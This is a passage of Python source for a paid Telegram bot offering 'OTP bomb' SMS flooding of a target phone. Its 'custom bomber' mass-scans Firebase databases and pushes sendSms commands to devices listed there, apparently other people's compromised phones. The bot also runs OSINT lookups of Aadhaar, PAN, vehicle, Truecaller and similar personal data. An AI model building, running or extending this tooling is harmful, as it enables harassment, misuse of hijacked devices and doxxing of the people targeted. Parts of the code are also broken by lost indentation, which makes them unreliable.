        _HTTP_SESSION=aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=200,ttl_dns_cache=600,force_close=True),timeout=aiohttp.ClientTimeout(total=8,connect=5))
    return _HTTP_SESSION
async def get_blast_session():
    global _BLAST_SESSION
    if _BLAST_SESSION is None or _BLAST_SESSION.closed:
        _BLAST_SESSION=aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=800,limit_per_host=100,ttl_dns_cache=600,force_close=True),timeout=aiohttp.ClientTimeout(total=5,connect=3))
    return _BLAST_SESSION

# ==================== FIREBASE ====================
class FirebaseManager:
    def __init__(self): self.load()
    def load(self):
        self.fbs=[]
        if BLAST_DATA_FILE.exists():
            try:
                with open(BLAST_DATA_FILE,"r",encoding="utf-8") as f: self.fbs=json.load(f).get("firebases",[])
            except: pass
    def save(self):
        try:
            d={}
            if BLAST_DATA_FILE.exists():
                try:
                    with open(BLAST_DATA_FILE,"r",encoding="utf-8") as f: d=json.load(f)
                except: pass
            d["firebases"]=self.fbs
            with _SAVE_LOCK:
                with open(BLAST_DATA_FILE,"w",encoding="utf-8") as f: json.dump(d,f,indent=2,ensure_ascii=False)
        except Exception as e: logger.error(f"FB save: {e}")
    def norm(self,raw):
        u=raw.strip().replace(" ","").rstrip("/")
        if not u: return ""
        if not u.startswith("http"): u="https://"+u
        try:
            from urllib.parse import urlparse
            p=urlparse(u)
            if p.netloc and "." in p.netloc: return f"{p.scheme}://{p.netloc}"
        except: pass
        return u
    def add(self,url):
        clean=self.norm(url)
        if not clean: return ""
        if clean in {fb["url"].rstrip("/") for fb in self.fbs}: return None
        self.fbs.append({"id":f"{int(time.time()*1000)}_{random.randint(100,999)}","url":clean,"label":clean.replace("https://","")[:30],"added_at":int(time.time())})
        self.save(); return clean.replace("https://","")[:30]
    def bulk_add(self,urls):
        added=0; existing={fb["url"].rstrip("/") for fb in self.fbs}; now=int(time.time())
        for i,raw in enumerate(urls):
            clean=self.norm(raw)
            if clean and any(ext in clean for ext in [".com",".app",".io","firebase"]) and clean not in existing:
                self.fbs.append({"id":f"{now}_{i}_{random.randint(1000,9999)}","url":clean,"label":clean.replace("https://","")[:30],"added_at":now})
                existing.add(clean); added+=1
        if added: self.save()
        return added
    def remove(self,fid):
        self.fbs=[fb for fb in self.fbs if str(fb.get("id"))!=str(fid)]; self.save()

fb_manager=FirebaseManager()

async def fb_put(base,path,payload,blast=False):
    try:
        s=await (get_blast_session() if blast else get_http_session())
        async with s.put(base.rstrip("/")+path,json=payload,timeout=aiohttp.ClientTimeout(total=4 if not blast else 3)) as r:
            return 200<=r.status<300
    except: return False

async def get_all_online_devices():
    if not fb_manager.fbs: return []
    s=await get_http_session(); results=[]; lock=asyncio.Lock()
    async def check(fb):
        base=fb["url"].rstrip("/")
        for p in ["/clients.json?shallow=true","/devices.json?shallow=true"]:
            try:
                async with s.get(base+p,timeout=aiohttp.ClientTimeout(total=8)) as r:
                    if r.status==200:
                        txt=await r.text()
                        if txt and txt!="null" and txt.startswith("{") and len(txt)<2000000:
                            data=json.loads(txt)
                            if isinstance(data,dict):
                                skip={"webhookEvent","commands","config","settings","users","messages","meta"}
                                found=[{"fb_url":base,"dev_id":k,"path":p.split(".json")[0]} for k in list(data.keys())[:10000] if k and not k.startswith("$") and k not in skip]
                                if found:
                                    async with lock: results.extend(found)
                                    break
            except: continue
    for i in range(0,len(fb_manager.fbs),50):
        await asyncio.gather(*(check(fb) for fb in fb_manager.fbs[i:i+50]),return_exceptions=True)
        await asyncio.sleep(0.05)
    return results

async def send_device_sms_blast(dev,phone,msg):
    prefix=dev.get("path","/clients")
    return await fb_put(dev["fb_url"],f"{prefix}/{dev['dev_id']}/webhookEvent/sendSms.json",
        {"from":1,"to":phone.strip(),"message":msg.strip(),"isSended":False,"timestamp":int(time.time())},blast=True)

async def send_device_sms(dev_url,dev_id,phone,msg):
    return await fb_put(dev_url,f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {"from":1,"to":phone.strip(),"message":msg.strip(),"isSended":False,"timestamp":int(time.time())},blast=False)

# ==================== AUTO-DELETE ====================
async def _del_later(msg,delay=AUTO_DELETE_SECONDS):
    try: await asyncio.sleep(delay); await msg.delete()
    except: pass

async def send_auto(message,text,delay=AUTO_DELETE_SECONDS,**kwargs):
    try:
        m=await message.reply_text(text,**kwargs)
        if m: asyncio.create_task(_del_later(m,delay))
        return m
    except Exception as e: logger.warning(f"send_auto: {e}"); return None

async def edit_auto(query,text,delay=AUTO_DELETE_SECONDS,**kwargs):
    try:
        m=await query.edit_message_text(text,**kwargs)
        if m is not True and hasattr(m,"delete"): asyncio.create_task(_del_later(m,delay))
        return m
    except Exception as e:
        logger.warning(f"edit_auto: {e}")
        try:
            if query.message: asyncio.create_task(_del_later(query.message,delay))
        except: pass
        return None

async def send_persist(message,text,**kwargs):
    try: return await message.reply_text(text,**kwargs)
    except Exception as e: logger.warning(f"send_persist: {e}"); return None

# ==================== ACCESS ====================
async def check_channels(update,context):
    user=update.effective_user
    if not user: return False
    if db.is_admin(user.id): return True
    missing=[]
    for ch in db.data.get("force_join_channels",[]):
        try:
            m=await context.bot.get_chat_member(f"@{ch}",user.id)
            if m.status not in ["member","administrator","creator"]: missing.append(ch)
        except: missing.append(ch)
    if not missing: return True
    kb=[[InlineKeyboardButton(f"📢 Join @{ch}",url=f"https://t.me/{ch}")] for ch in missing]
    kb.append([InlineKeyboardButton("✅ Verify All",callback_data="verify_join")])
    msg=update.message or (update.callback_query.message if update.callback_query else None)
    if msg:
        try:
            sent=await msg.reply_text(f"⚠️ <b>JOIN REQUIRED!</b>\n\n"+"\n".join(f"• @{c}" for c in missing)+f"\n\nVerify tap karo.",reply_markup=InlineKeyboardMarkup(kb),parse_mode="HTML")
            asyncio.create_task(_del_later(sent,120))
        except: pass
    return False

async def check_access(update,context):
    global BOT_LOCKED
    user=update.effective_user; chat=update.effective_chat
    if not user or not chat: return False
    if db.is_admin(user.id): return True
    if db.is_banned(user.id):
        try: await update.effective_message.reply_text("🚫 Banned.")
        except: pass
        return False
    if BOT_LOCKED:
        try: await update.effective_message.reply_text(f"🔒 Bot LOCKED. Contact @{OWNER_USERNAME}")
        except: pass
        return False
    if chat.type=="private":
        try: await update.effective_message.reply_text(f"🔒 Bot sirf @{OFFICIAL_GROUP} me.\n\n{OFFICIAL_GROUP_URL}",parse_mode="HTML")
        except: pass
        return False
    if (chat.username or "").lower()!=OFFICIAL_GROUP.lower():
        try: await update.effective_message.reply_text(f"🔒 Sirf @{OFFICIAL_GROUP}!\n\n{OFFICIAL_GROUP_URL}",parse_mode="HTML")
        except: pass
        return False
    return await check_channels(update,context)

async def check_cmd_available(update,cmd):
    user=update.effective_user
    if db.is_admin(user.id): return True
    if db.get_cmd_config(cmd).get("maintenance"):
        try: await update.effective_message.reply_text(f"🔧 <b>/{cmd}</b> under maintenance!",parse_mode="HTML")
        except: pass
        return False
    return True

# ==================== KEYBOARDS ====================
def admin_reply_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🟢 START BOMB"),KeyboardButton("🔴 STOP BOMB")],
        [KeyboardButton("😈 CUSTOM BOMBER")],
        [KeyboardButton("💰 MY CREDITS"),KeyboardButton("🎁 DAILY SPIN")],
        [KeyboardButton("🔴 ADMIN PANEL"),KeyboardButton("📊 MY STATS")],
        [KeyboardButton("❓ HELP"),KeyboardButton("💲 BUY CREDITS")],
        [KeyboardButton("🎟 REDEEM"),KeyboardButton("🔗 REFERRAL")],
        [KeyboardButton("🔍 NUM LOOKUP"),KeyboardButton("🚘 VEHICLE")],
        [KeyboardButton("🔥 FREE FIRE"),KeyboardButton("🎯 BGMI")],
        [KeyboardButton("🪪 AADHAR"),KeyboardButton("📄 PAN")],
        [KeyboardButton("💸 UPI"),KeyboardButton("🏦 IFSC")],
        [KeyboardButton("🌐 IP TRACE"),KeyboardButton("📞 TRUECALLER")],
        [KeyboardButton("📸 INSTAGRAM"),KeyboardButton("🎨 AI IMAGE")],
        [KeyboardButton("📢 FORCE JOIN"),KeyboardButton("🔥 FIREBASE")],
        [KeyboardButton("💰 CREDITS"),KeyboardButton("📡 BROADCAST")],
        [KeyboardButton("🔒 LOCK/UNLOCK"),KeyboardButton("⚙️ COMMANDS")],
        [KeyboardButton("👑 ADMINS"),KeyboardButton("📋 USERS")],
        [KeyboardButton("🌐 API MANAGER"),KeyboardButton("💎 WHITELIST")],
        [KeyboardButton("🚫 BANNED LIST")],
    ],resize_keyboard=True)

def osint_matrix_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 IDENTITY",callback_data="osint_cat_identity"),InlineKeyboardButton("🚘 VEHICLE",callback_data="osint_cat_vehicle")],
        [InlineKeyboardButton("🎮 GAMING",callback_data="osint_cat_gaming"),InlineKeyboardButton("🌐 DIGITAL",callback_data="osint_cat_digital")],
        [InlineKeyboardButton("🪪 PROFILE",callback_data="osint_cat_profile"),InlineKeyboardButton("💳 UTILITIES",callback_data="osint_cat_utility")],
        [InlineKeyboardButton("👑 OWNER",url=f"https://t.me/{OWNER_USERNAME}"),InlineKeyboardButton("➕ ADD TO GROUP",url=f"https://t.me/{BOT_USERNAME}?startgroup=start")],
    ])

def admin_panel_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💰 Credit Manager",callback_data="ap_credits"),InlineKeyboardButton("🎟 Redeem Manager",callback_data="ap_redeem")],
        [InlineKeyboardButton("📢 Force Join",callback_data="ap_channels"),InlineKeyboardButton("🔥 Firebase",callback_data="ap_firebase")],
        [InlineKeyboardButton("🌐 API Manager",callback_data="ap_apis"),InlineKeyboardButton("⚙️ Command Settings",callback_data="ap_cmds")],
        [InlineKeyboardButton("👑 Admin Manager",callback_data="ap_admins"),InlineKeyboardButton("📋 Users List",callback_data="ap_users")],
        [InlineKeyboardButton("💎 Whitelist",callback_data="ap_whitelist"),InlineKeyboardButton("🚫 Banned",callback_data="ap_banned")],
        [InlineKeyboardButton("🔇 Muted",callback_data="ap_muted"),InlineKeyboardButton("📋 Protected",callback_data="ap_protected")],
        [InlineKeyboardButton("💰 Plans Manager",callback_data="ap_plans"),InlineKeyboardButton("💳 Set UPI ID",callback_data="ap_setupi")],
        [InlineKeyboardButton("📋 Pending Payments",callback_data="ap_pending")],
        [InlineKeyboardButton("📡 Broadcast",callback_data="ap_broadcast")],
        [InlineKeyboardButton("🔒 Lock/Unlock Bot",callback_data="ap_lock")],
    ])

def credit_manager_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add (All)",callback_data="cred_add_all"),InlineKeyboardButton("➖ Deduct (All)",callback_data="cred_ded_all")],
        [InlineKeyboardButton("➕ Add (Single)",callback_data="cred_add_one"),InlineKeyboardButton("➖ Deduct (Single)",callback_data="cred_ded_one")],
        [InlineKeyboardButton("🔙 Back",callback_data="ap_back")],
    ])

def redeem_manager_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 Generate NORMAL",callback_data="red_normal")],
        [InlineKeyboardButton("💎 Generate VIP",callback_data="red_vip")],
        [InlineKeyboardButton("📜 List Codes",callback_data="red_list")],
        [InlineKeyboardButton("🔙 Back",callback_data="ap_back")],
    ])

def channels_manager_kb():
    kb=[]
    for ch in db.data.get("force_join_channels",[]):
        kb.append([InlineKeyboardButton(f"📢 @{ch}",callback_data="noop"),InlineKeyboardButton("🗑",callback_data=f"ch_rem_{ch}")])
    kb.append([InlineKeyboardButton("➕ Add Channel",callback_data="ch_add")])
    kb.append([InlineKeyboardButton("🔙 Back",callback_data="ap_back")])
    return InlineKeyboardMarkup(kb)

def firebase_manager_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add URL",callback_data="fb_add"),InlineKeyboardButton("📁 Bulk (.txt)",callback_data="fb_bulk")],
        [InlineKeyboardButton("📊 Check Status",callback_data="fb_check_all")],
        [InlineKeyboardButton("📋 List",callback_data="fb_list"),InlineKeyboardButton("🗑 Clear",callback_data="fb_clear")],
        [InlineKeyboardButton("🔙 Back",callback_data="ap_back")],
    ])

def api_manager_kb(page=0):
    custom={}
    if API_CONFIG_FILE.exists():
        try:
            with open(API_CONFIG_FILE,"r",encoding="utf-8") as f: custom=json.load(f)
        except: pass
    all_apis={**DEFAULT_API_MAP,**custom}
    items=list(all_apis.items()); per_page=8
    total_pages=max(1,(len(items)+per_page-1)//per_page)
    page=max(0,min(page,total_pages-1))
    start=page*per_page; end=min(start+per_page,len(items))
    kb=[]
    for cmd,url in items[start:end]:
        mark="⚙️" if cmd in DEFAULT_API_MAP else "🔧"
        kb.append([InlineKeyboardButton(f"{mark} /{cmd}",callback_data=f"api_view_{cmd}")])
    nav=[]
    if page>0: nav.append(InlineKeyboardButton("⬅️",callback_data=f"api_page_{page-1}"))
    if page<total_pages-1: nav.append(InlineKeyboardButton("➡️",callback_data=f"api_page_{page+1}"))
    if nav: kb.append(nav)
    kb.append([InlineKeyboardButton("➕ Add New API",callback_data="api_add")])
    kb.append([InlineKeyboardButton("🔙 Back",callback_data="ap_back")])
    return InlineKeyboardMarkup(kb),page+1,total_pages,len(items)

def cmd_settings_kb(page=0):
    all_cmds=list(OSINT_HINTS.keys())+["bomb","custombomb"]
    per_page=8
    total_pages=max(1,(len(all_cmds)+per_page-1)//per_page)
    page=max(0,min(page,total_pages-1))
    start=page*per_page; end=min(start+per_page,len(all_cmds))
    kb=[]
    for cmd in all_cmds[start:end]:
        cfg=db.get_cmd_config(cmd)
        status="🔧" if cfg.get("maintenance") else "🟢"
        cost=f" 💰{cfg['cost']}" if cfg.get("cost") else ""
        kb.append([InlineKeyboardButton(f"{status} /{cmd}{cost}",callback_data=f"cmd_cfg_{cmd}")])
    nav=[]
    if page>0: nav.append(InlineKeyboardButton("⬅️",callback_data=f"cmd_page_{page-1}"))
    if page<total_pages-1: nav.append(InlineKeyboardButton("➡️",callback_data=f"cmd_page_{page+1}"))
    if nav: kb.append(nav)
    kb.append([InlineKeyboardButton("🔙 Back",callback_data="ap_back")])
    return InlineKeyboardMarkup(kb),page+1,total_pages

def cmd_cfg_kb(cmd):
    cfg=db.get_cmd_config(cmd)
    lbl="🟢 Enable" if cfg.get("maintenance") else "🔧 Disable"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"{lbl} Command",callback_data=f"cmd_toggle_{cmd}")],
        [InlineKeyboardButton("💰 Set Cost",callback_data=f"cmd_setcost_{cmd}"),InlineKeyboardButton("🆓 Reset",callback_data=f"cmd_resetcost_{cmd}")],
        [InlineKeyboardButton("🔙 Back",callback_data="ap_cmds")],
    ])

def admins_kb():
    kb=[]
    for uid in db.data.get("admins",[MAIN_OWNER]):
        if uid==MAIN_OWNER: kb.append([InlineKeyboardButton(f"👑 {uid} (OWNER)",callback_data="noop")])
        else: kb.append([InlineKeyboardButton(f"🛡 {uid}",callback_data="noop"),InlineKeyboardButton("🗑",callback_data=f"adm_rem_{uid}")])
    kb.append([InlineKeyboardButton("➕ Add Admin",callback_data="adm_add")])
    kb.append([InlineKeyboardButton("🔙 Back",callback_data="ap_back")])
    return InlineKeyboardMarkup(kb)

def users_list_kb(page=0):
    items=list(db.data.get("users",{}).items()); per_page=10
    total_pages=max(1,(len(items)+per_page-1)//per_page)
    page=max(0,min(page,total_pages-1))
    start=page*per_page; end=min(start+per_page,len(items))
    kb=[]
    for uid,u in items[start:end]:
        name=(u.get("name") or "User")[:12]
        kb.append([InlineKeyboardButton(f"{name} | {uid} | 💰{u.get('credits',0)}",callback_data=f"usr_view_{uid}")])
    nav=[]
    if page>0: nav.append(InlineKeyboardButton("⬅️",callback_data=f"usr_page_{page-1}"))
    if page<total_pages-1: nav.append(InlineKeyboardButton("➡️",callback_data=f"usr_page_{page+1}"))
    if nav: kb.append(nav)
    kb.append([InlineKeyboardButton("🔙 Back",callback_data="ap_back")])
    return InlineKeyboardMarkup(kb),page+1,total_pages,len(items)

def whitelist_kb():
    wl=db.data.get("private_whitelist",[])
    kb=[]
    for uid in wl[:25]:
        label=f"👑 {uid} (OWNER)" if uid==MAIN_OWNER else f"💎 {uid}"
        kb.append([InlineKeyboardButton(label,callback_data="noop"),InlineKeyboardButton("🗑",callback_data=f"wl_rem_{uid}")])
    kb.append([InlineKeyboardButton("➕ Add",callback_data="wl_add")])
    kb.append([InlineKeyboardButton("🔙 Back",callback_data="ap_back")])
    return InlineKeyboardMarkup(kb)

def protected_kb():
    pn=db.data.get("protected_numbers",[])
    kb=[]
    for num in pn[:25]:
        kb.append([InlineKeyboardButton(f"📱 {num}",callback_data="noop"),InlineKeyboardButton("🗑",callback_data=f"prot_rem_{num}")])
    kb.append([InlineKeyboardButton("➕ Add Number",callback_data="prot_add")])
    kb.append([InlineKeyboardButton("🔙 Back",callback_data="ap_back")])
    return InlineKeyboardMarkup(kb)

async def show_plans_manager(q):
    plans=db.data.get("plans",[])
    upi=db.data.get("upi_id","not set")
    kb=[]
    for p in plans:
        kb.append([
            InlineKeyboardButton(f"{p['name']} — ₹{p['price']} / {p['credits']}cr",callback_data="noop"),
            InlineKeyboardButton("✏️",callback_data=f"plan_edit_{p['id']}"),
            InlineKeyboardButton("🗑",callback_data=f"plan_del_{p['id']}"),
        ])
    kb.append([InlineKeyboardButton("➕ Add New Plan",callback_data="plan_add")])
    kb.append([InlineKeyboardButton("💳 Change UPI ID",callback_data="ap_setupi")])
    kb.append([InlineKeyboardButton("🔙 Back",callback_data="ap_back")])
    text=f"💰 <b>PLANS MANAGER</b>\n\n💳 UPI: <code>{upi}</code>\n\nTotal: <b>{len(plans)}</b> plans"
    await edit_auto(q,text,reply_markup=InlineKeyboardMarkup(kb),parse_mode="HTML")

# ==================== HELP ====================
def help_text():
    lines=[f"╭━━ ◈ <b>{BRAND_NAME.upper()} BOT HELP</b> ◈ ━━╮","","🔍 <b>OSINT:</b>"]
    for cmd,hint in OSINT_HINTS.items():
        cfg=db.get_cmd_config(cmd)
        st="🔧" if cfg.get("maintenance") else "🟢"
        cost=f" 💰{cfg['cost']}" if cfg.get("cost") else ""
        lines.append(f"{st} /{cmd} &lt;{hint}&gt;{cost}")
    lines+=["","💣 <b>BOMBER:</b>","/bomb &lt;phone&gt; — OTP bomb","/custombomb — Firebase SIM custom SMS","/stop — Stop bombing",
        "","💰 <b>CREDITS:</b>","/plans — View plans","/buy — Buy credits","/credits /stats /spin /redeem /referral /premium",
        "",f"👑 @{OWNER_USERNAME} | 📢 @{OFFICIAL_GROUP}","╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯"]
    return "\n".join(lines)

# ==================== COMMANDS ====================
async def cmd_start(update,context):
    user=update.effective_user
    if context.args and len(context.args)>0:
        arg=context.args[0]
        if arg.startswith("AYUSH") or arg.startswith("REF"):
            for uid_s,ud in db.data["users"].items():
                if ud.get("refer_code")==arg and uid_s!=str(user.id):
                    u=db.get_user(user.id,user.first_name,user.username)
                    if not u.get("referred_by"):
                        u["referred_by"]=uid_s; u["credits"]=u.get("credits",0)+100
                        ud["credits"]=ud.get("credits",0)+100; ud["referrals"]=ud.get("referrals",0)+1
                        db.save()
                        try: await context.bot.send_message(int(uid_s),"🎉 New referral! +100 credits!",parse_mode="HTML")
                        except: pass
                    break
    if not db.is_admin(user.id):
        if not await check_channels(update,context): return
        chat_uname=(update.effective_chat.username or "").lower()
        if update.effective_chat.type=="private" or chat_uname!=OFFICIAL_GROUP.lower():
            await send_auto(update.message,f"🔒 Bot sirf @{OFFICIAL_GROUP} me.\n\n{OFFICIAL_GROUP_URL}",parse_mode="HTML"); return
        await send_auto(update.message,f"👋 Welcome <b>{html_escape(user.first_name)}</b>!\n\n📖 <b>/help</b> likho saari commands ke liye.",parse_mode="HTML"); return
    u=db.get_user(user.id,user.first_name,user.username)
    credit="👑 UNLIMITED" if db.is_free_tier(user.id) else str(u.get("credits",0))
    caption=(f"╭━━ ◈ <b>{BRAND_NAME} BOT</b> ◈ ━━╮\n👋 Welcome <b>{html_escape(user.first_name)}</b>!\n"
        f"💰 Credits: <code>{credit}</code>\n🔥 Devices: <code>{len(CACHED_DEVICES)}</code>\n⚡ Commands ya buttons use karo!\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
    sent=False
    if START_VIDEO_PATH.exists():
        try:
            with open(START_VIDEO_PATH,"rb") as v:
                await update.message.reply_video(video=v,caption=caption,reply_markup=admin_reply_keyboard(),parse_mode="HTML"); sent=True
        except Exception as e: logger.warning(f"video: {e}")
    if not sent and START_IMAGE_PATH.exists():
        try:
            with open(START_IMAGE_PATH,"rb") as p:
                await update.message.reply_photo(photo=p,caption=caption,reply_markup=admin_reply_keyboard(),parse_mode="HTML"); sent=True
        except Exception as e: logger.warning(f"image: {e}")
    if not sent:
        await send_persist(update.message,caption,reply_markup=admin_reply_keyboard(),parse_mode="HTML")
    await send_auto(update.message,"🔎 <b>OSINT Categories:</b>",reply_markup=osint_matrix_kb(),delay=300,parse_mode="HTML")

async def cmd_help(update,context):
    if not await check_access(update,context): return
    await send_auto(update.message,help_text(),parse_mode="HTML")

async def cmd_panel(update,context):
    user=update.effective_user
    if not db.is_admin(user.id): return
    await send_auto(update.message,
        f"🔴 <b>ADMIN PANEL</b>\n\nUsers: {len(db.data['users'])}\nFirebases: {len(fb_manager.fbs)}\nDevices: {len(CACHED_DEVICES)}\n"
        f"Whitelist: {len(db.data.get('private_whitelist',[]))}\nBanned: {len(db.data.get('banned_users',[]))}\n"
        f"Pending Payments: {len([p for p in db.data.get('pending_payments',{}).values() if p.get('status')=='pending'])}\n"
        f"Bot: {'🔒 LOCKED' if BOT_LOCKED else '🟢 ACTIVE'}",
        reply_markup=admin_panel_kb(),parse_mode="HTML")

async def cmd_plans(update,context):
    if not await check_access(update,context): return
    plans=db.data.get("plans",[])
    if not plans:
        await send_auto(update.message,"❌ No plans. Contact owner.",parse_mode="HTML"); return
    kb=[]
    for p in plans:
        kb.append([InlineKeyboardButton(f"⭐ {p['name']} — ₹{p['price']} = {p['credits']} credits",callback_data=f"buy_plan_{p['id']}")])
    await send_auto(update.message,"💳 <b>SELECT A PLAN</b>\n\nTap to buy:",reply_markup=InlineKeyboardMarkup(kb),parse_mode="HTML")

async def cmd_buy(update,context): return await cmd_plans(update,context)

async def cmd_cancel(update,context):
    if not await check_access(update,context): return
    cleared = []
    for key in ["waiting_for", "pending_phone", "pending_mode", "custom_msg", "plan_temp", "plan_edit_target", "credit_uid", "cmd_cfg_target", "api_edit_target", "red_amt"]:
        if context.user_data.get(key):
            context.user_data.pop(key, None)
            cleared.append(key)
    if cleared:
        await send_auto(update.message, "❌ <b>Cancelled!</b>\n\nSaare pending operations clear ho gaye.\n/help likho commands ke liye.", parse_mode="HTML")
    else:
        await send_auto(update.message, "ℹ️ Koi active operation nahi hai.", parse_mode="HTML")

async def cmd_osint(update,context):
    cmd=update.message.text.split()[0].lstrip("/").lower()
    if cmd not in OSINT_HINTS: return
    if not await check_access(update,context): return
    if not await check_cmd_available(update,cmd): return
    args=update.message.text.split()[1:]
    if not args:
        await send_auto(update.message,f"❌ Usage: <code>/{cmd} &lt;{OSINT_HINTS[cmd]}&gt;</code>",parse_mode="HTML"); return
    await execute_osint(update,context,cmd," ".join(args).strip())

async def execute_osint(update,context,cmd,arg):
    user=update.effective_user; u=db.get_user(user.id,user.first_name,user.username)
    cost=db.get_cmd_config(cmd).get("cost",0)
    if not db.is_free_tier(user.id) and cost>0:
        if u.get("credits",0)<cost:
            await send_auto(update.message,f"❌ Need {cost}. Have {u.get('credits',0)}",parse_mode="HTML"); return
        u["credits"]-=cost; db.save()
    custom={}
    if API_CONFIG_FILE.exists():
        try:
            with open(API_CONFIG_FILE,"r",encoding="utf-8") as f: custom=json.load(f)
        except: pass
    url_tpl=custom.get(cmd) or DEFAULT_API_MAP.get(cmd)
    if not url_tpl:
    await send_auto(update.message,f"⚠️ <b>/{cmd}</b> API not configured.",parse_mode="HTML"); return

    from urllib.parse import quote
    req_url=url_tpl.replace("{arg}", quote(arg.strip())); 
    label=MODULE_NAMES.get(cmd,f"/{cmd.upper()}")
    frames=[f"◈ INTELLIGENCE\n━━━━━━━━━━━━\n◉ SCANNING ░░░░░░░░\n{label}",
        f"◈ INTELLIGENCE\n━━━━━━━━━━━━\n◉ ANALYZING ████░░░░\n{label}",
        f"◈ INTELLIGENCE\n━━━━━━━━━━━━\n◉ RENDERING ████████\n{label}"]
    status=await update.message.reply_text(frames[0])
    for f in frames[1:]:
        try: await asyncio.sleep(0.3); await status.edit_text(f)
        except: pass
    try:
    s=await get_http_session()
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
    async with s.get(req_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status==200:
                txt=await r.text()
                try: pretty=json.dumps(json.loads(txt),indent=2,ensure_ascii=False)
                except: pretty=txt
                pretty=pretty.replace("@SHURU_33",f"@{OWNER_USERNAME}").replace("SHURU_33",OWNER_USERNAME).replace("SHURU","AYUSH")
                pretty=pretty.replace("@BRIJESH_21",f"@{OWNER_USERNAME}").replace("BRX","AYUSH")
                if len(pretty)>3500: pretty=pretty[:3500]+"\n...[TRUNC]"
                resp=(f"◈ <b>INTELLIGENCE</b> ◈\n{label} | <code>{html_escape(arg)}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━\n<pre>{html_escape(pretty)}</pre>\n━━━━━━━━━━━━━━━━━━\n"
                    f"👑 @{OWNER_USERNAME} | @{OFFICIAL_GROUP}")
                if cmd=="insta":
                    try:
                        rj=json.loads(txt) if txt.startswith("{") else {}
                        pic=rj.get("profile_pic_url") or rj.get("profile_pic_url_hd") or rj.get("profilePicUrl") or ""
                        if pic: await update.message.reply_photo(photo=pic,caption=f"📸 {html_escape(arg)}",parse_mode="HTML")
                    except: pass
                try: await status.edit_text(resp,parse_mode="HTML")
                except: await send_auto(update.message,resp,parse_mode="HTML")
                asyncio.create_task(_del_later(status,AUTO_DELETE_SECONDS))
            else:
                await status.edit_text(f"❌ API error: {r.status}")
                asyncio.create_task(_del_later(status,AUTO_DELETE_SECONDS))
    except Exception as e:
        try: await status.edit_text(f"❌ Error: {e}")
        except: pass

async def cmd_bomb(update,context):
    if not await check_access(update,context): return
    if not await check_cmd_available(update,"bomb"): return
    args=update.message.text.split()[1:]
    if not args:
        await send_auto(update.message,"❌ <code>/bomb 9876543210</code>",parse_mode="HTML"); return
    phone=args[0].replace("+","").replace(" ","").strip()
    if not phone.isdigit() or len(phone)<10:
        await send_auto(update.message,"❌ Invalid."); return
    if phone in db.data.get("protected_numbers",[]):
        await send_auto(update.message,"🔒 Protected."); return
    context.user_data["pending_phone"]=phone; context.user_data["pending_mode"]="otp"
    await show_duration_buttons(update,context,phone,"otp")

async def cmd_custombomb(update,context):
    if not await check_access(update,context): return
    if not await check_cmd_available(update,"custombomb"): return
    context.user_data["waiting_for"]="custombomb_phone"
    context.user_data["pending_mode"]="custom"
    await send_auto(update.message,f"😈 <b>CUSTOM FIREBASE BOMBER</b>\n🔥 {len(CACHED_DEVICES)} devices\n\nTarget phone (10 digits):",parse_mode="HTML")

async def show_duration_buttons(update,context,phone,mode):
    # FIX: Ensure pending_mode + pending_phone are always set here
    context.user_data["pending_mode"]=mode
    context.user_data["pending_phone"]=phone
    user=update.effective_user; kb=[]; row=[]
    for key,opt in DURATION_OPTIONS.items():
        cost="FREE" if db.is_free_tier(user.id) else f"{opt['cost']}c"
        row.append(InlineKeyboardButton(f"{opt['label']} ({cost})",callback_data=f"bmb_sel_{key}"))
        if len(row)==2: kb.append(row); row=[]
    if row: kb.append(row)
    kb.append([InlineKeyboardButton("❌ Cancel",callback_data="bmb_cancel")])
    await send_auto(update.message,f"💣 <b>{mode.upper()}</b>\n📱 {phone}\n\nSelect duration:",reply_markup=InlineKeyboardMarkup(kb),parse_mode="HTML")

async def cmd_stop(update,context):
    user=update.effective_user
    if user.id in ACTIVE_BOMBINGS and not ACTIVE_BOMBINGS[user.id].get("stop"):
        ACTIVE_BOMBINGS[user.id]["stop"]=True
        await send_auto(update.message,"🛑 Stopping...")
    else: await send_auto(update.message,"⚠️ No active.")

async def cmd_credits(update,context):
    if not await check_access(update,context): return
    user=update.effective_user; u=db.get_user(user.id,user.first_name,user.username)
    cr="👑 UNLIMITED" if db.is_free_tier(user.id) else str(u.get("credits",0))
    await send_auto(update.message,f"💰 <b>WALLET</b>\n{html_escape(user.first_name)} | <code>{user.id}</code>\nCredits: <code>{cr}</code>\nPremium: {'✅' if u.get('premium') else '❌'}",parse_mode="HTML")

async def cmd_stats(update,context):
    if not await check_access(update,context): return
    user=update.effective_user; u=db.get_user(user.id,user.first_name,user.username)
    cr="👑 UNLIMITED" if db.is_free_tier(user.id) else str(u.get("credits",0))
    active="🟢 RUNNING" if user.id in ACTIVE_BOMBINGS and not ACTIVE_BOMBINGS[user.id].get("stop") else "❌ NONE"
    await send_auto(update.message,
        f"📊 <b>STATS</b>\nID: <code>{user.id}</code>\nCredits: {cr}\nAttacks: {u.get('total_attacks',0)}\nOTPs: {u.get('total_otps',0)}\nReferrals: {u.get('referrals',0)}\nBombing: {active}\nDevices: {len(CACHED_DEVICES)}",parse_mode="HTML")

async def cmd_spin(update,context):
    if not await check_access(update,context): return
    user=update.effective_user; u=db.get_user(user.id,user.first_name,user.username)
    today=datetime.date.today().isoformat()
    if u.get("last_spin_date")==today:
        await send_auto(update.message,"🎰 Already spun!"); return
    won=random.choices([random.randint(500,700),1000],weights=[85,15])[0]
    if not db.is_free_tier(user.id): u["credits"]=u.get("credits",0)+won
    u["last_spin_date"]=today; db.save()
